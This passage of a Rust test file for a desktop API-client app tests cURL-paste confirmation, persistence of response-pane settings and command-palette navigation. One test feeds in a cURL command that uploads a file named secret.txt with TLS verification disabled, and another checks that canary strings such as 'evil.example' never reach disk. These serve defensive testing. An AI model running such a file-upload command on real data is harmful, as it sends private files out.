            std::fs::read_to_string(root.path().join(&project_id).join("project.json")).unwrap();
        assert!(!disk_json.contains("secret-canary"));
        assert!(!disk_json.contains("evil.example"));
        let disk_project = store.load(&project_id).unwrap();
        let disk_req = disk_project.find_request(&request_id).unwrap();
        assert_eq!(disk_req.url, "https://example.com/original");
        assert_eq!(disk_req.method, "POST");
    }

    #[test]
    fn curl_paste_on_dirty_draft_requires_confirmation_and_preserves_edits_until_confirmed() {
        run_view_test(check_curl_paste_on_dirty_draft);
    }

    fn check_curl_paste_on_dirty_draft() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.body_kind = 1;
                view.body_editor
                    .update(cx, |ed, cx| ed.set_value(r#"{"draft":1}"#, window, cx));
                view.append_header_preset("X-Draft", "yes", window, cx);
                view.timeout
                    .update(cx, |t, cx| t.replace_all("4500", window, cx));
                assert!(view.dirty);

                // Pasting a plain GET cURL command must not wipe unsaved edits silently.
                view.url.update(cx, |input, cx| {
                    input.replace_all("curl https://example.com/plain", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.url.read(cx).value().as_ref(), "");
                assert!(view.dirty);
                assert_eq!(view.body_kind, 1);
                assert_eq!(view.body_editor.read(cx).value().as_ref(), r#"{"draft":1}"#);
                assert_eq!(view.headers_active_count, 1);
                assert_eq!(view.timeout.read(cx).value().as_ref(), "4500");

                let confirm = view
                    .active_curl_confirm
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("replacement confirmation dialog should open");
                assert!(confirm.read(cx).replace_summary.is_some());

                // Explicitly confirming replacement updates the draft.
                view.apply_confirmed_curl_view(&confirm, window, cx);
                assert_eq!(
                    view.url.read(cx).value().as_ref(),
                    "https://example.com/plain"
                );
                assert_eq!(view.body_kind, 0);
                assert_eq!(view.headers_active_count, 0);
                assert_eq!(view.timeout.read(cx).value().as_ref(), "30000");
            });
        })
        .unwrap();
    }

    #[test]
    fn curl_paste_with_unsupported_flags_prompts_before_applying() {
        run_view_test(check_curl_paste_unsupported_flags);
    }

    fn check_curl_paste_unsupported_flags() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        "curl --form file=@secret.txt -k https://example.com/upload",
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.url.read(cx).value().as_ref(), "");
            assert!(!v.dirty);
            let confirm = v
                .active_curl_confirm
                .as_ref()
                .and_then(|w| w.upgrade())
                .expect("unsupported flags should trigger confirmation before applying");
            assert_eq!(
                confirm.read(cx).report.unsupported_flags,
                vec!["--form".to_string(), "-k".to_string()]
            );
        })
        .unwrap();
    }

    #[test]
    fn response_position_defaults_to_right_and_persists_across_reloads() {
        run_view_test(check_response_position_and_settings_dialog);
    }

    fn check_response_position_and_settings_dialog() {
        use crate::response_view::ResponsePosition;
        use gpui_kit::component::WindowExt as _;

        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.response_position, ResponsePosition::Right);
                assert!(!window.has_active_dialog(cx));

                view.open_response_settings_dialog(window, cx);
                assert!(window.has_active_dialog(cx));
                window.close_dialog(cx);

                view.set_response_position(ResponsePosition::Left, cx);
                assert_eq!(view.response_position, ResponsePosition::Left);

                view.toggle_response_wrap(cx);
                assert!(view.response_wrap);

                view.toggle_response_raw(cx);
                assert!(view.response_raw);

                view.set_response_position(ResponsePosition::Bottom, cx);
                assert_eq!(view.response_position, ResponsePosition::Bottom);
            });
        })
        .unwrap();

        // Reload in a fresh view against the same store root and verify persisted UI settings.
        let (window2, view2) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window2, |_, _, cx| {
            let v = view2.read(cx);
            assert_eq!(v.response_position, ResponsePosition::Bottom);
            assert!(v.response_wrap);
            assert!(v.response_raw);
        })
        .unwrap();
    }

    #[test]
    fn command_palette_toggles_filters_and_executes_targets() {
        run_view_test(check_command_palette_flow);
    }

    fn check_command_palette_flow() {
        use crate::command_palette::{
            PaletteAction, PaletteSection, PaletteTarget, execute_palette_target, filter_catalog,
        };
        use crate::response_view::ResponsePosition;
        use gpui_kit::component::WindowExt as _;

        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());

        let mut proj1 = store.create("Payments API").unwrap();
        let mut parent = Folder::new("Billing");
        let mut child = Folder::new("Invoices");
        let child_id = child.id.clone();
        let parent_id = parent.id.clone();
        let invoice_req =
            ApiRequest::new("POST", "Create Invoice", "https://api.example/v1/invoices");
        let invoice_req_id = invoice_req.id.clone();
        child.requests.push(invoice_req);
        parent.folders.push(child);
        proj1.collections[0].folders.push(parent);
        let health_req = ApiRequest::new("GET", "Health Check", "https://api.example/health");
        proj1.collections[0].requests.push(health_req);
        store.save(&proj1).unwrap();

        let proj2 = store.create("Auth Service").unwrap();
        store.save(&proj2).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            let weak_view = view.downgrade();
            view.update(cx, |view, cx| {
                let payments_ix = view
                    .projects
                    .iter()
                    .position(|p| p.name == "Payments API")
                    .expect("Payments API project");
                view.switch_project(payments_ix, window, cx);

                assert!(!window.has_active_dialog(cx));
                view.open_command_palette(window, cx);
                assert!(window.has_active_dialog(cx));

                let palette = view
                    .active_command_palette
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("palette view entity");
                {
                    let catalog = &palette.read(cx).catalog;
                    let groups = filter_catalog(catalog, "post invo");
                    assert_eq!(groups[0].0, PaletteSection::Requests);
                    assert_eq!(groups[0].1[0].title, "Create Invoice");

                    let folder_groups = filter_catalog(catalog, "Invoices");
                    assert!(
                        folder_groups
                            .iter()
                            .any(|(sec, entries)| *sec == PaletteSection::Folders
                                && entries.iter().any(|e| e.title == "Invoices"))
                    );
                }

                // Calling open_command_palette again toggles the palette closed.
                view.open_command_palette(window, cx);
                assert!(!window.has_active_dialog(cx));
                assert!(view.active_command_palette.is_none());
            });

            // Execute Request navigation target.
            execute_palette_target(
                PaletteTarget::Request {
                    id: invoice_req_id.clone(),
                },
                &weak_view,
                window,
                cx,
            );
            view.update(cx, |view, _| {
                assert_eq!(view.selected_id.as_deref(), Some(invoice_req_id.as_str()));
                assert!(view.open_tabs.contains(&invoice_req_id));
                view.expanded.clear();
            });

            // Execute nested Folder target: expands ancestor & folder and focuses it.
            execute_palette_target(
                PaletteTarget::Folder {
                    id: child_id.clone(),
                    ancestor_ids: vec![parent_id.clone()],
                },
                &weak_view,
                window,
                cx,
            );
            view.update(cx, |view, _| {
                assert!(view.expanded.contains(&parent_id));
                assert!(view.expanded.contains(&child_id));
                assert_eq!(view.target_folder.as_deref(), Some(child_id.as_str()));
            });

            // Execute CycleResponsePosition action.
            execute_palette_target(
                PaletteTarget::Action(PaletteAction::CycleResponsePosition),
                &weak_view,
                window,
                cx,
            );
            assert_eq!(view.read(cx).response_position, ResponsePosition::Bottom);

            // Execute Project switch and check project_selector sync.
            let target_proj_idx = view
                .read(cx)
                .projects
                .iter()
                .position(|p| p.name == "Auth Service")
                .expect("Auth Service project");
            execute_palette_target(
                PaletteTarget::Project {
                    index: target_proj_idx,
                },
                &weak_view,
                window,
                cx,
            );
            let v = view.read(cx);
            assert_eq!(v.active_project, target_proj_idx);
            assert_eq!(
                v.project_selector
                    .read(cx)
                    .selected_index(cx)
                    .map(|p| p.row),
                Some(target_proj_idx)
            );
        })
        .unwrap();
    }
}
